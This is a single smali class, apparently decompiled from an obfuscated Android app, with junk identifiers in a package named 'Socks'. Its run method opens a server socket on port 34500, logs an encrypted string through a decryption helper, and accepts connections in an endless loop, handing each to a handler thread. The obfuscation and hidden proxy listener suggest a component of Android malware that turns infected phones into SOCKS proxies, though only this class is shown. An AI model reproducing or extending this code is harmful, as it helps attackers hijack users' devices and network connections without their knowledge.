.class Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;


# direct methods
.method constructor <init>(Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;)V
    .locals 0

    iput-object p1, p0, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    :try_start_0
    new-instance v0, Ljava/net/ServerSocket;

    const v1, 0x86c4

    invoke-direct {v0, v1}, Ljava/net/ServerSocket;-><init>(I)V

    iget-object v1, p0, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;

    invoke-static {v1}, Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;->fsafsdfsfsdfsfsdfsd(Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v3, 0x0

    const-string v4, "jXHC\u0007"

    invoke-static {v4}, Lcompse/refact/st/upsssss/ertertetetetete;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v0}, Ljava/net/ServerSocket;->getLocalPort()I

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    invoke-virtual {v0}, Ljava/net/ServerSocket;->accept()Ljava/net/Socket;

    move-result-object v1

    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;

    invoke-direct {v3, v1}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;-><init>(Ljava/net/Socket;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    return-void
.end method
